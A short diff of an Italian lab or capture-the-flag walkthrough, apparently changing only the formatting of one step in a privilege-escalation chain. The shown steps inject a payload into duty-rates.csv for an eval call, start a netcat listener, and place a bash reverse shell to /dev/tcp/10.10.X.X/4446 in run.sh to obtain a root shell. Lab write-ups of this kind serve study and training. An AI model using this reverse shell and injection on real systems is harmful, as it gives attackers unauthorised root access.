@@ -149,7 +149,7 @@ else:
 + scriviamo un payload semplice all'interno di duty-rates.csv in modo che eval lo esegua
 + mettiamo in ascolto il listener sulla porta 4446 della nostra macchina attaccante con `nc  -lvnp 4446`
 + e mettiamo in ascolto il nostro servizio sulla porta 8000 con `python3 -m http.server 8000`
-+ creiamo run.sh con dentro ==**bash -i &> /dev/tcp/10.10.X.X/4446 0>&1**==
++ creiamo run.sh con dentro **`bash -i &> /dev/tcp/10.10.X.X/4446 0>&1`**
 +  alla chiusura e salvataggio delle nove modifiche di `nano duty-rates.csv`
 +  Guardando il terminale del listener sulla porta 4446 digitiamo `whoami` e siamo root
 
